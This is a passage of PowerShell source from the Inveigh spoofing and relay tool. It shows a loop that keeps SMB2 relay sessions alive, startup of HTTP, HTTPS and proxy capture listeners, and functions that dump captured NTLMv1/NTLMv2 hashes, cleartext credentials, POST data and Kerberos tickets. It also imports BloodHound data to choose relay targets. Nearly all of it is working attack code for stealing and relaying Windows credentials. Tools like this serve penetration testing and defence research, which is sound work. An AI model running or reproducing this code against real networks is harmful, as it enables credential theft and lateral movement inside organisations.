                Stop-InveighRunspace "reaching run time"
            }

        }

        if($inveigh.file_output -and -not $inveigh.control)
        {

            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveAt(0)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveAt(0)
            }

            while($inveigh.cleartext_file_queue.Count -gt 0)
            {
                $inveigh.cleartext_file_queue[0]|Out-File $inveigh.cleartext_out_file -Append
                $inveigh.cleartext_file_queue.RemoveAt(0)
            }

            while($inveigh.form_input_file_queue.Count -gt 0)
            {
                $inveigh.form_input_file_queue[0]|Out-File $inveigh.form_input_out_file -Append
                $inveigh.form_input_file_queue.RemoveAt(0)
            }
        
        }

        if(!$inveigh.console_output -and $ConsoleQueueLimit -ge 0)
        {

            while($inveigh.console_queue.Count -gt $ConsoleQueueLimit -and !$inveigh.console_output)
            {
                $inveigh.console_queue.RemoveAt(0)
            }

        }

        if(!$inveigh.status_output -and !$inveigh.running)
        {
            Invoke-OutputQueueLoop
        }

        Start-Sleep -m 5

        if($inveigh.stop)
        {
            $inveigh.console_queue.Clear()
            Stop-InveighRunspace
        }

    }

 }

# Session Refresh Loop ScriptBlock
$session_refresh_scriptblock = 
{
    param ($SessionRefresh)

    $process_ID_bytes = Get-ProcessIDArray

    while($inveigh.relay_running)
    {

        if($inveigh.session_socket_table.Count -gt 0)
        {
            $session = 0

            while($session -lt $inveigh.session_socket_table.Count)
            {
                $session_timespan =  New-TimeSpan $inveigh.session[$session]."Last Activity" $(Get-Date)
                
                if($inveigh.session_socket_table[$session].Connected -and $inveigh.session_lock_table[$session] -eq 'open' -and $session_timespan.Minutes -ge $SessionRefresh)
                {
                    $inveigh.session_lock_table[$session] = 'locked'
                    $client = $inveigh.session_socket_table[$session]
                    $client_stream = $client.GetStream()
                    $session_ID = $inveigh.session_table[$session]
                    $message_ID =  $inveigh.session_message_ID_table[$session]
                    $tree_ID = 0x00,0x00,0x00,0x00
                    $client_receive = New-Object System.Byte[] 1024
                    $SMB_path = "\\" + $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString + "\IPC$"
                    $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
                    $message_ID++
                    $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $false $message_ID $process_ID_bytes $tree_ID $session_ID
                    $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                    $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                    $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                    $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                    try
                    {
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                    }
                    catch
                    {
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay session $session has closed") > $null
                        $inveigh.session[$session] | Where-Object {$_.Status = "disconnected"}
                    }

                    if($inveigh.session_socket_table[$session].Connected)
                    {
                        $tree_ID = $client_receive[40..43]
                        Start-Sleep -s 1
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $false $message_ID $process_ID_bytes $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        }
                        catch
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay session $session has closed") > $null
                            $inveigh.session[$session] | Where-Object {$_.Status = "disconnected"}
                        }

                    }

                    $inveigh.session_lock_table[$Session] = 'open'
                    $inveigh.session[$Session] | Where-Object {$_."Last Activity" = Get-Date -format s}
                    $inveigh.session_message_ID_table[$Session] = $message_ID
                }

                $session++
                Start-Sleep -s 1
            }
         
        }

        Start-Sleep -s 1
    }

}

#endregion
#region begin startup functions

 # HTTP Listener Startup Function 
function HTTPListener
{
    $HTTP_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_listener = $false
    $proxy_listener = $false
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [PowerShell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($packet_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(
        $HTTPIP).AddArgument($HTTPPort).AddArgument(
        $HTTPS_listener).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(
        $Service).AddArgument($SMB_version).AddArgument($SessionLimitPriv).AddArgument(
        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($TargetMode).AddArgument($TargetRefresh).AddArgument($Username).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $HTTP_powershell.BeginInvoke() > $null
}

# HTTPS Listener Startup Function 
function HTTPSListener
{
    $HTTPS_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_listener = $true
    $proxy_listener = $false
    $HTTPS_runspace.Open()
    $HTTPS_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTPS_powershell = [PowerShell]::Create()
    $HTTPS_powershell.Runspace = $HTTPS_runspace
    $HTTPS_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($packet_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(
        $HTTPIP).AddArgument($HTTPSPort).AddArgument(
        $HTTPS_listener).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(
        $Service).AddArgument($SMB_version).AddArgument($SessionLimitPriv).AddArgument(
        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($TargetMode).AddArgument($TargetRefresh).AddArgument($Username).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $HTTPS_powershell.BeginInvoke() > $null
}

# Proxy Listener Startup Function 
function ProxyListener
{
    $proxy_runspace = [RunspaceFactory]::CreateRunspace()
    $HTTPS_listener = $false
    $proxy_listener = $true
    $proxy_runspace.Open()
    $proxy_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $proxy_powershell = [PowerShell]::Create()
    $proxy_powershell.Runspace = $proxy_runspace
    $proxy_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $proxy_powershell.AddScript($packet_functions_scriptblock) > $null
    $proxy_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Attack).AddArgument($Challenge).AddArgument(
        $Command).AddArgument($Enumerate).AddArgument($EnumerateGroup).AddArgument($FailedLoginThreshold).AddArgument(
        $ProxyIP).AddArgument($ProxyPort).AddArgument(
        $HTTPS_listener).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
        $RelayAutoDisable).AddArgument($RepeatEnumerate).AddArgument($RepeatExecute).AddArgument(
        $Service).AddArgument($SMB_version).AddArgument($SessionLimitPriv).AddArgument(
        $SessionLimitUnpriv).AddArgument($SessionLimitShare).AddArgument($SessionPriority).AddArgument(
        $Target).AddArgument($TargetMode).AddArgument($TargetRefresh).AddArgument($Username).AddArgument(
        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
    $proxy_powershell.BeginInvoke() > $null
}

# Control Relay Startup Function
function ControlRelayLoop
{
    $control_relay_runspace = [RunspaceFactory]::CreateRunspace()
    $control_relay_runspace.Open()
    $control_relay_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $control_relay_powershell = [PowerShell]::Create()
    $control_relay_powershell.Runspace = $control_relay_runspace
    $control_relay_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($ADIDNS_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($packet_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $control_relay_powershell.AddScript($control_relay_scriptblock).AddArgument($ConsoleQueueLimit).AddArgument(
        $RelayAutoExit).AddArgument($RunTime) > $null
    $control_relay_powershell.BeginInvoke() > $null
}

# Session Refresh Startup Function
function SessionRefreshLoop
{
    $session_refresh_runspace = [RunspaceFactory]::CreateRunspace()
    $session_refresh_runspace.Open()
    $session_refresh_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $session_refresh_powershell = [PowerShell]::Create()
    $session_refresh_powershell.Runspace = $session_refresh_runspace
    $session_refresh_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $session_refresh_powershell.AddScript($packet_functions_scriptblock) > $null
    $session_refresh_powershell.AddScript($SMB_relay_functions_scriptblock) > $null
    $session_refresh_powershell.AddScript($session_refresh_scriptblock).AddArgument($SessionRefresh) > $null
    $session_refresh_powershell.BeginInvoke() > $null
}

#endregion
#region begin startup enabled services

# HTTP Server Start
if($HTTP -eq 'Y')
{
    HTTPListener
    Start-Sleep -m 50
}

# HTTPS Server Start
if($HTTPS -eq 'Y')
{
    HTTPSListener
    Start-Sleep -m 50
}

# Proxy Server Start
if($Proxy -eq 'Y')
{
    ProxyListener
    Start-Sleep -m 50
}

# Control Relay Loop Start
ControlRelayLoop

# Session Refresh Loop Start
if($SessionRefresh -gt 0)
{
    SessionRefreshLoop
}

# Console Output Loop
try
{

    if($ConsoleOutput -ne 'N')
    {

        if($ConsoleStatus)
        {    
            $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
            $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        }

        :console_loop while(($inveigh.relay_running -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {

                        if($inveigh.output_stream_only)
                        {
                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                        }
                        else
                        {
                            Write-Warning($inveigh.console_queue[0])
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {

                            if($inveigh.output_stream_only)
                            {
                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                            }
                            else
                            {
                                Write-Output($inveigh.console_queue[0])
                            }

                        }

                        $inveigh.console_queue.RemoveAt(0)
                    } 

                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
                    {
                    
                        if($ConsoleOutput -ne "Low")
                        {

                            if($inveigh.output_stream_only)
                            {
                                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                            }
                            else
                            {
                                Write-Output($inveigh.console_queue[0])
                            }

                        }

                        $inveigh.console_queue.RemoveAt(0)
                    } 

                    default
                    {

                        if($inveigh.output_stream_only)
                        {
                            Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                        }
                        else
                        {
                            Write-Output($inveigh.console_queue[0])
                        }

                        $inveigh.console_queue.RemoveAt(0)
                    }

                }
                
            }

            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
            {
            
                if($inveigh.cleartext_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $inveigh.newline)
                    $inveigh.cleartext_list.Sort()
                    $POST_request_list_temp = $inveigh.POST_request_list

                    foreach($unique_POST_request in $POST_request_list_temp)
                    {
                        if($unique_cleartext -ne $unique_cleartext_last)
                        {
                            Write-Output($unique_cleartext + $inveigh.newline)
                        }

                        $unique_cleartext_last = $unique_cleartext
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $inveigh.newline)
                }

                if($inveigh.POST_request_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $inveigh.newline)
                    $inveigh.POST_request_list.Sort()
                    $NTLMv1_list_temp = $inveigh.NTLMv1_list

                    foreach($unique_NTLMv1 in $NTLMv1_list_temp)
                    {
                        if($unique_POST_request -ne $unique_POST_request_last)
                        {
                            Write-Output($unique_POST_request + $inveigh.newline)
                        }

                        $unique_POST_request_last = $unique_POST_request
                    }

                    Start-Sleep -m 5
                }
            
                if($inveigh.NTLMv1_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
                    $inveigh.NTLMv1_list.Sort()
                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list

                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)
                    {
                        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

                        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
                        {
                            Write-Output($unique_NTLMv1 + $inveigh.newline)
                        }

                        $unique_NTLMv1_account_last = $unique_NTLMv1_account
                    }

                    $unique_NTLMv1_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)
                    $NTLMv1_username_list_temp = $inveigh.NTLMv1_username_list

                    foreach($NTLMv1_username in $NTLMv1_username_list_temp)
                    {
                        Write-Output($NTLMv1_username + $inveigh.newline)
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $inveigh.newline)
                }

                if($inveigh.NTLMv2_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
                    $inveigh.NTLMv2_list.Sort()
                    $NTLMv2_list_temp = $inveigh.NTLMv2_list

                    foreach($unique_NTLMv2 in $NTLMv2_list_temp)
                    {
                        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

                        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
                        {
                            Write-Output($unique_NTLMv2 + $inveigh.newline)
                        }

                        $unique_NTLMv2_account_last = $unique_NTLMv2_account
                    }

                    $unique_NTLMv2_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)
                    $NTLMv2_username_list_temp = $inveigh.NTLMv2_username_list

                    foreach($NTLMv2_username in $NTLMv2_username_list_temp)
                    {
                        Write-Output($NTLMv2_username + $inveigh.newline)
                    }
                
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $inveigh.newline)
                }

                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

            }

            if($inveigh.console_input)
            {

                if([Console]::KeyAvailable)
                {
                    $inveigh.console_output = $false
                    BREAK console_loop
                }
        
            }

            Start-Sleep -m 5
        }

    }

}
finally
{

    if($Tool -eq 2)
    {
        $inveigh.relay_running = $false
    }

}

}

#endregion
#region begin support functions

function Stop-Inveigh
{
<#
.SYNOPSIS
Stop-Inveigh will stop all running Inveigh functions.
#>

    if($inveigh)
    {
        $inveigh.stop = $true
        
        if($inveigh.running -or $inveigh.relay_running)
        {
            $inveigh.console_queue.Clear()
            Watch-Inveigh -NoConsoleMessage
        }
        else
        {
            Write-Output "[-] There are no running Inveigh functions"
        }

    }

}

function Get-Inveigh
{
<#
.SYNOPSIS
Get-Inveigh will get stored Inveigh data from memory.

.PARAMETER Console
Get queued console output. This is also the default if no parameters are set.

.PARAMETER ADIDNS
Get added DNS host records.

.PARAMETER ADIDNSFailed
Get failed DNS host record adds.

.PARAMETER Cleartext
Get captured cleartext credentials.

.PARAMETER CleartextUnique
Get unique captured cleartext credentials.

.PARAMETER KerberosUsername
Get IP addresses, usernames, and index for captured Kerberos TGTs.

.PARAMETER KerberosTGT
Get Kerberos TGT kirbi byte array by index.

.PARAMETER Learning
Get valid hosts discovered through spoofer learning.

.PARAMETER Log
Get log entries.

.PARAMETER NTLMv1
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv1Unique
Get the first captured NTLMv1 challenge/response for each unique account.

.PARAMETER NTLMv1Usernames
Get IP addresses and usernames for captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2Unique
Get the first captured NTLMv2 challenge/response for each unique account.

.PARAMETER NTLMv2Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER POSTRequest
Get captured POST requests.

.PARAMETER POSTRequestUnique
Get unique captured POST request.

.PARAMETER Session
Get relay session list.
#>

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][Switch]$Cleartext,
        [parameter(Mandatory=$false)][Switch]$CleartextUnique,
        [parameter(Mandatory=$false)][Switch]$Console,
        [parameter(Mandatory=$false)][Switch]$ADIDNS,
        [parameter(Mandatory=$false)][Switch]$ADIDNSFailed,
        [parameter(Mandatory=$false)][Int]$KerberosTGT,
        [parameter(Mandatory=$false)][Switch]$KerberosUsername,
        [parameter(Mandatory=$false)][Switch]$Learning,
        [parameter(Mandatory=$false)][Switch]$Log,
        [parameter(Mandatory=$false)][Switch]$NTLMv1,
        [parameter(Mandatory=$false)][Switch]$NTLMv2,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
        [parameter(Mandatory=$false)][Switch]$POSTRequest,
        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
        [parameter(Mandatory=$false)][Switch]$Session,
        [parameter(Mandatory=$false)][Switch]$Enumerate,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($Console -or $PSBoundParameters.Count -eq 0)
    {

        while($inveigh.console_queue.Count -gt 0)
        {

            if($inveigh.output_stream_only)
            {
                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveAt(0)
            }
            else
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                }

            }
            
        }

    }

    if($ADIDNS)
    {
        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys

        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
        {
            
            if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)
            {
                Write-Output $ADIDNS_host
            }

        }

    }

    if($ADIDNSFailed)
    {

        $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys

        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
        {
            
            if($inveigh.ADIDNS_table.$ADIDNS_host -eq 0)
            {
                Write-Output $ADIDNS_host
            }

        }

    }

    if($KerberosTGT)
    {
        Write-Output $inveigh.kerberos_TGT_list[$KerberosTGT]
    }

    if($KerberosUsername)
    {
        Write-Output $inveigh.kerberos_TGT_username_list
    }

    if($Log)
    {
        Write-Output $inveigh.log
    }

    if($NTLMv1)
    {
        Write-Output $inveigh.NTLMv1_list
    }

    if($NTLMv1Unique)
    {
        $inveigh.NTLMv1_list.Sort()
        $NTLMv1_list_temp = $inveigh.NTLMv1_list

        foreach($unique_NTLMv1 in $NTLMv1_list_temp)
        {
            $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

            if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
            {
                Write-Output $unique_NTLMv1
            }

            $unique_NTLMv1_account_last = $unique_NTLMv1_account
        }

    }

    if($NTLMv1Usernames)
    {
        Write-Output $inveigh.NTLMv2_username_list
    }

    if($NTLMv2)
    {
        Write-Output $inveigh.NTLMv2_list
    }

    if($NTLMv2Unique)
    {
        $inveigh.NTLMv2_list.Sort()
        $NTLMv2_list_temp = $inveigh.NTLMv2_list

        foreach($unique_NTLMv2 in $NTLMv2_list_temp)
        {
            $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

            if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
            {
                Write-Output $unique_NTLMv2
            }

            $unique_NTLMv2_account_last = $unique_NTLMv2_account
        }

    }

    if($NTLMv2Usernames)
    {
        Write-Output $inveigh.NTLMv2_username_list
    }

    if($Cleartext)
    {
        Write-Output $inveigh.cleartext_list
    }

    if($CleartextUnique)
    {
        Write-Output $inveigh.cleartext_list | Get-Unique
    }

    if($POSTRequest)
    {
        Write-Output $inveigh.POST_request_list
    }

    if($POSTRequestUnique)
    {
        Write-Output $inveigh.POST_request_list | Get-Unique
    }

    if($Learning)
    {
        Write-Output $inveigh.valid_host_list
    }

    if($Session)
    {
        $i = 0

        while($i -lt $inveigh.session_socket_table.Count)
        {

            if(!$inveigh.session_socket_table[$i].Connected)
            {
                $inveigh.session[$i] | Where-Object {$_.Status = "disconnected"}
            }
        
            $i++
        }

        Write-Output $inveigh.session | Format-Table -AutoSize
    }

    if($Enumerate)
    {
        Write-Output $inveigh.enumerate
    }

}

function Watch-Inveigh
{
<#
.SYNOPSIS
Watch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.

.PARAMETER ConsoleOutput
(Medium,Low) Medium and Low can be used to reduce output.
#>

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Switch]$NoConsoleMessage,
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium","Y")][String]$ConsoleOutput = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($inveigh.tool -ne 1)
{

    if($inveigh.running -or $inveigh.relay_running)
    {
        
        if(!$NoConsoleMessage)
        {
            Write-Output "[*] Press any key to stop console output"
        }

        $inveigh.console_output = $true

        :console_loop while((($inveigh.running -or $inveigh.relay_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    {$_ -like "*spoofer disabled]" -or $_ -like "*local request]" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {
                            Write-Output $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    {$_ -like "*response sent]" -or $_ -like "*ignoring*" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy*request for *" -or $_ -like "*SYN packet*"}
                    {
                    
                        if($ConsoleOutput -ne "Low")
                        {
                            Write-Output $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                } 

            }

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-Output "[-] Inveigh isn't running"
    }

}
else
{
    Write-Output "[-] Watch-Inveigh cannot be used with current external tool selection"
}

}

function Clear-Inveigh
{
<#
.SYNOPSIS
Clear-Inveigh will clear Inveigh data from memory.
#>

if($inveigh)
{

    if(!$inveigh.running -and !$inveigh.relay_running)
    {
        Remove-Variable inveigh -scope global
        Write-Output "[+] Inveigh data has been cleared from memory"
    }
    else
    {
        Write-Output "[-] Run Stop-Inveigh before running Clear-Inveigh"
    }

}

}

function ConvertTo-Inveigh
{
    <#
    .SYNOPSIS
    ConvertTo-Inveigh imports Bloodhound computers, groups and session JSON files into $inveigh.enumerate
    for Inveigh Relay targeting.

    .DESCRIPTION
    For the fastest import, import the data before gather any enumeration data with Inveigh.

    .PARAMETER BloodHoundComputersJSON
    BloodHound computers file.

    .PARAMETER BloodHoundSessionsJSON
    BloodHound sessions file.

    .PARAMETER BloodHoundGroupsJSON
    BloodHound groups file.

    .PARAMTER DNS
    Enable DNS lookups
    #>

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Computers,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Sessions,
        [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$Groups,
        [parameter(Mandatory=$false)][Switch]$DNS,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if(!$Computers -and !$Sessions -and !$Groups)
    {
        Write-Output "Specifiy a BloodHound computers, groups, or sessions JSON file"
        throw
    }

    if($inveigh.running -or $inveigh.relay_running)
    {
        Write-Output "Run Stop-Inveigh before importing data with ConvertTo-Inveigh"
        throw
    }

    if(!$inveigh)
    {
        $global:inveigh = [HashTable]::Synchronized(@{})
        $inveigh.cleartext_list = New-Object System.Collections.ArrayList
        $inveigh.enumerate = New-Object System.Collections.ArrayList
        $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
        $inveigh.log = New-Object System.Collections.ArrayList
        $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList
        $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList
        $inveigh.POST_request_list = New-Object System.Collections.ArrayList
        $inveigh.valid_host_list = New-Object System.Collections.ArrayList
        $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})
        $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})
        $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})
        $inveigh.relay_history_table = [HashTable]::Synchronized(@{})
        $inveigh.request_table = [HashTable]::Synchronized(@{})
        $inveigh.session_socket_table = [HashTable]::Synchronized(@{})
        $inveigh.session_table = [HashTable]::Synchronized(@{})
        $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})
        $inveigh.session_lock_table = [HashTable]::Synchronized(@{})
        $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})
        $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
        $inveigh.group_table = [HashTable]::Synchronized(@{})
        $inveigh.session_count = 0
        $inveigh.session = @()
    }

    function New-RelayEnumObject
    {
        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,
            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,
            $IPv6Only,$Targeted,$Enumerate,$Execute)

        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}
